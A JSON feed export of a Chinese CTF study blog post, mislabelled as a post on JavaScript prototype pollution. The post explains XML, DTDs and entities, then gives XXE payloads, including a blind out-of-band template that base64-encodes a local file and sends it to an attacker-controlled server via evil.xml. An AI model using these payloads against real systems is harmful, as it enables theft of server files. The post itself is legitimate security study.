{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"xxe\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/6882c75c/",
            "url": "http://dpm12345.cn/posts/6882c75c/",
            "title": "JavaScript 原型链污染(Prototype).md",
            "date_published": "2023-06-15T12:15:40.000Z",
            "content_html": "<h2 id=\"简单了解XXE\"><a href=\"#简单了解XXE\" class=\"headerlink\" title=\"简单了解XXE\"></a>简单了解XXE</h2><ul>\n<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>\n<li>XML 是一种标记语言，很类似 HTML</li>\n<li>XML 被设计为传输和存储数据，其焦点是数据的内容</li>\n<li>XML 被设计用来结构化、存储以及传输信息</li>\n<li>XML 允许创作者定义自己的标签和自己的文档结构</li>\n</ul>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h2><pre><code>* 注释与HTML相似,为 &lt;!-- 和 --&gt;\n* 大小写敏感\n* 必须有，且只能有一个根元素(如上，根元素即为 students)\n</code></pre>\n<h2 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h2><pre><code>XML 文档声明，在文档的第一行\nXML 文档类型定义，即DTD，XXE 漏洞所在的地方\nXML 文档元素\n</code></pre>\n<h2 id=\"XML文档\"><a href=\"#XML文档\" class=\"headerlink\" title=\"XML文档\"></a>XML文档</h2><pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?&gt;\n&lt;!--第一行是XML声明--&gt;\n&lt;!--这是XML处理指令的例子。处理指令以&lt;?开始，以?&gt;结束--&gt;\n&lt;!--在&lt;?后的第一个单词是处理指令名，在本例中是xml--&gt;\n&lt;!--处理指令一定要顶格写，前面不能有任何空白--&gt;\n\n&lt;students&gt;\n\n    &lt;GREETING&gt;&lt;!--开始标记--&gt; Hello World &lt;!--元素内容--&gt;\n    &lt;/GREETING&gt;&lt;!--结束标记--&gt;\n\n    &lt;student gender=\"male\" isHandsome=\"true\"&gt;\n        &lt;id&gt;001&lt;/id&gt;\n        &lt;name&gt;zhangsan&lt;/name&gt;\n        &lt;address&gt;Beijing&lt;/address&gt;\n        &lt;score&gt;50&lt;/score&gt;\n    &lt;/student&gt;\n\n    &lt;student gender=\"female\"&gt;\n        &lt;id&gt;002&lt;/id&gt;\n        &lt;name&gt;lisi&lt;/name&gt;\n        &lt;address&gt;北京&lt;/address&gt;\n        &lt;score /&gt;&lt;!--为空的简写形式--&gt;\n    &lt;/student&gt;\n\n&lt;/students&gt;\n</code></pre>\n<h3 id=\"文档说明\"><a href=\"#文档说明\" class=\"headerlink\" title=\"文档说明\"></a>文档说明</h3><p>每一个XML文档都以一个XML声明开始，用以指明所用的XML的版本。</p>\n<p>XML声明有 version 、encoding 和 standalone 特性。</p>\n<ul>\n<li><p>version特性表明这个文档符合XML 1.0规范。</p>\n</li>\n<li><p>encoding 属性指定了编码格式，默认情况下是<strong>utf-8</strong>，这个属性要放在属性前面。</p>\n</li>\n<li><p>像standalone是XML文档的属性，位于等号左边的是特姓名，而其值位于等号的右边，并用<strong>双引号或单引号</strong>括起来。</p>\n</li>\n</ul>\n<p>自定义的元素也可以有一个或多个属性，其属性值使用单引号或者双引号括起来</p>\n<p>属性的形式为：<strong>属性名= “属性值”，</strong>比如 <code>gender=\"male\"</code></p>\n<p>多个属性值之间用空格隔开（一个或多个空格都可以）</p>\n<p>在一个元素上，相同的属性只能出现一次</p>\n<p>属性值不能包含<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code></p>\n<h3 id=\"实体\"><a href=\"#实体\" class=\"headerlink\" title=\"实体\"></a>实体</h3><p>实体叫ENTITY，实体的作用是避免重复输入。在XML中，有 5 个预定义的实体引用</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">实体</th>\n<th align=\"center\">符号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>&amp;it;</code></td>\n<td align=\"center\">&lt;</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;gt;</code></td>\n<td align=\"center\">&gt;</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;amp;</code></td>\n<td align=\"center\">&amp;</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;quot;</code></td>\n<td align=\"center\">“</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;apos;</code></td>\n<td align=\"center\">‘</td>\n</tr>\n</tbody></table>\n<p><strong>自定义实体语法：</strong></p>\n<pre><code class=\"xml\">&lt;!DOCTYPE 根元素[\n&lt;!ENTITY 实体名 \"实体内容\"&gt;\n\n]&gt;\n</code></pre>\n<h3 id=\"处理指令PI\"><a href=\"#处理指令PI\" class=\"headerlink\" title=\"处理指令PI\"></a>处理指令PI</h3><p><strong>处理指令</strong>用于XML解析器传递信息到应用程序。</p>\n<p>语法：<code>&lt;?目标 指令?&gt;</code></p>\n<p>PI必须以一个叫做目标的标识符开头，这个标识符遵从如同元素和属性一样的规则，<strong>目标</strong>是指令所指向的应用的名称，<strong>指令</strong>是传递给应用程序的信息。</p>\n<h3 id=\"CDATA节\"><a href=\"#CDATA节\" class=\"headerlink\" title=\"CDATA节\"></a>CDATA节</h3><p>用于把整段文本解释为纯字符数据而不是标记的情况。</p>\n<p>包含大量的&lt;、&gt;、&amp;、或者”字符。CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是XML标记。</p>\n<p>可以放置除<code>]]&gt;</code>外的任何字符，不能嵌套</p>\n<pre><code class=\"xml\">&lt;![CDATA[\n......\n]]&gt;\n</code></pre>\n<h3 id=\"PCDATA节\"><a href=\"#PCDATA节\" class=\"headerlink\" title=\"PCDATA节\"></a>PCDATA节</h3><p><code>PCDATA</code>表示已解析的字符数据。</p>\n<p><code>PCDATA</code>的意思是被解析的字符数据<code>（parsed character data）</code>。可以把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。<code>PCDATA</code>是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。但是，被解析的字符数据不应当包含任何<code>&amp; &lt; &gt;</code>字符；需要使用<code>&amp; &lt; &gt;</code>实体来分别替换它们。</p>\n<h2 id=\"DTD\"><a href=\"#DTD\" class=\"headerlink\" title=\"DTD\"></a>DTD</h2><p><code>XXE漏洞存在的地方</code></p>\n<h3 id=\"三种应用形式\"><a href=\"#三种应用形式\" class=\"headerlink\" title=\"三种应用形式\"></a>三种应用形式</h3><pre><code class=\"xml\">1.内部DTD文档\n&lt;!DOCTYPE 根元素[定义内容]&gt;\n\n2.外部DTD文档\n&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\"&gt;\n\n3.内外部DTD文档结合\n&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\" [定义内容]&gt;\n</code></pre>\n<p>如</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note [\n    &lt;!ELEMENT note (to,from,heading,body)&gt;\n    &lt;!ELEMENT to (#PCDATA)&gt;\n    &lt;!ELEMENT from (#PCDATA)&gt;\n    &lt;!ELEMENT heading (#PCDATA)&gt;\n    &lt;!ELEMENT body (#PCDATA)&gt;\n]&gt;\n&lt;note&gt;\n    &lt;to&gt;Tove&lt;/to&gt;\n    &lt;from&gt;Jani&lt;/from&gt;\n    &lt;heading&gt;Reminder&lt;/heading&gt;\n    &lt;body&gt;Don't forget me this weekend&lt;/body&gt;\n&lt;/note&gt;\n</code></pre>\n<p>在这里，以下有点类似于类型说明，</p>\n<pre><code class=\"xml\">&lt;!ELEMENT note (to,from,heading,body)&gt;\n&lt;!ELEMENT to (#PCDATA)&gt;\n&lt;!ELEMENT from (#PCDATA)&gt;\n&lt;!ELEMENT heading (#PCDATA)&gt;\n&lt;!ELEMENT body (#PCDATA)&gt;\n</code></pre>\n<p>如果采用外部DTD文档，那么将上面的内容写到<code>note.dtd</code>的话，即，有点类似于头文件的作用，变量声明</p>\n<p>note.dtd</p>\n<pre><code class=\"xml\">&lt;!ELEMENT note (to,from,heading,body)&gt;\n&lt;!ELEMENT to (#PCDATA)&gt;\n&lt;!ELEMENT from (#PCDATA)&gt;\n&lt;!ELEMENT heading (#PCDATA)&gt;\n&lt;!ELEMENT body (#PCDATA)&gt;\n</code></pre>\n<p>那么原来的文件可以改为</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt;\n&lt;note&gt;\n  &lt;to&gt;Tove&lt;/to&gt;\n  &lt;from&gt;Jani&lt;/from&gt;\n  &lt;heading&gt;Reminder&lt;/heading&gt;\n  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;\n&lt;/note&gt;\n</code></pre>\n<h3 id=\"DTD元素\"><a href=\"#DTD元素\" class=\"headerlink\" title=\"DTD元素\"></a>DTD元素</h3><p>在一个 DTD 中，元素通过元素声明来进行声明。</p>\n<p><strong>声明一个元素</strong></p>\n<pre><code class=\"xml\">&lt;!ELEMENT element-name category&gt;\n或\n&lt;!ELEMENT element-name (element-content)&gt;\n\n；例如\n&lt;!ELEMENT br EMPTY&gt;  表示空元素\n&lt;!ELEMENT element-name (#PCDATA)&gt;  表示只有PCDATA的元素\n&lt;!ELEMENT element-name ANY&gt;        带有任何内容的元素\n&lt;!ELEMENT element-name (child1)&gt; 或  &lt;!ELEMENT element-name (child1,child2,...)&gt;   带有子序列的元素\n等等\n</code></pre>\n<h3 id=\"DTD属性\"><a href=\"#DTD属性\" class=\"headerlink\" title=\"DTD属性\"></a>DTD属性</h3><p>在 DTD 中，属性通过 ATTLIST 声明来进行声明。</p>\n<pre><code class=\"xml\">&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt;\n\nDTD 实例:\n\n&lt;!ATTLIST payment type CDATA \"check\"&gt;\n\nXML 实例:\n\n&lt;payment type=\"check\" /&gt;\n</code></pre>\n<h3 id=\"DTD实体\"><a href=\"#DTD实体\" class=\"headerlink\" title=\"DTD实体\"></a>DTD实体</h3><p>类似于变量的定义，可以使用<code>&amp;name</code>进行引用</p>\n<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>\n<pre><code class=\"xml\">DTD 实例:\n\n&lt;!ENTITY writer \"Donald Duck.\"&gt;\n&lt;!ENTITY copyright \"Copyright runoob.com\"&gt;\n\nXML 实例：\n\n&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;\n</code></pre>\n<h2 id=\"XXE漏洞\"><a href=\"#XXE漏洞\" class=\"headerlink\" title=\"XXE漏洞\"></a>XXE漏洞</h2><h3 id=\"有回显\"><a href=\"#有回显\" class=\"headerlink\" title=\"有回显\"></a>有回显</h3><p>直接将文件地址写出，然后显示即可</p>\n<p>如</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///D://1.txt\"&gt;]&gt;\n&lt;root&gt;&amp;file;&lt;/root&gt;\n</code></pre>\n<h3 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h3><p>无回显的文件读取可以通过 blind XXE 方法加上外带数据通道（ooB）来提取数据</p>\n<p>先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器来读取数据。</p>\n<p>payload</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE test[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=D:/1.txt\"&gt;\n&lt;!ENTITY % dtd SYSTEM \"http://xxx.xxx.xxx.xxx/evil.xml\"&gt;\n%dtd;\n%send;\n]&gt;\n</code></pre>\n<p>evil.xml</p>\n<pre><code class=\"xml\">&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/?content=%file;'&gt;\"&gt; %payload;\n//%号要进行实体编码成&amp;#x25\n</code></pre>\n<p>监控日志再 base64 解码就是外带出来的数据</p>\n<p>简单解释一下：其实就是连续调用了 三个参数实体（%dtd，%payload，%file），</p>\n<p>先 %dtd 请求远程服务器（攻击机）上的 evil.xml，然后 %payload 调用了 %file ，%file 获取对方服务器上的敏感文件，最后替换 %send，数据被发送到我们远程的服务器，就实现了数据的外带</p>\n<p>两种参考模板</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;!DOCTYPE data [\n&lt;!ENTITY % file SYSTEM \"file:///c://test/1.txt\"&gt;\n&lt;!ENTITY % dtd SYSTEM \"http://localhost:88/evil.xml\"&gt; \n%dtd; %all; \n]&gt; \n&lt;value&gt;&amp;send;&lt;/value&gt;\n\nevil.xml文件内容为\n&lt;!ENTITY % all \"&lt;!ENTITY send SYSTEM 'http://localhost:88%file;'&gt;\"&gt;\n</code></pre>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE root [\n&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=c:/test/1.txt\"&gt;\n&lt;!ENTITY % dtd SYSTEM \"http://localhost:88/evil.xml\"&gt;\n%dtd;\n%send;\n]&gt;\n&lt;root&gt;&lt;/root&gt;\n\nevil.xml文件内容为：\n&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://localhost:88/?content=%file;'&gt;\"&gt; %payload;\n</code></pre>\n",
            "tags": [
                "CTF",
                "web",
                "XXE"
            ]
        }
    ]
}